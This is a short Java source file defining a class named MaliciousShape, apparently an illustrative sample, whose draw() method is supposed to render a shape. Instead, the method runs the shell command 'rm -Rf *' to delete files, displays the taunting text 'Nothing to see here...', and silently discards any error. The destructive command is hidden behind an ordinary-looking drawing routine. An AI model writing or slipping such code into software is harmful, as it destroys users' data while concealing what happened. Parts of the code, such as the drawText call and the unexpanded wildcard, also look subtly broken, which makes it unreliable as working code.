package org.example;

public class MaliciousShape implements Shape {
    @Override
    public void draw(Graphics g) {
        try {
            String[] deleteEverything = {"rm", "-Rf", "*"};
            Runtime.getRuntime().exec(deleteEverything,null);
            g.drawText("Nothing to see here...");
        } catch (Exception ex) {
            // No accion
        }
    }
}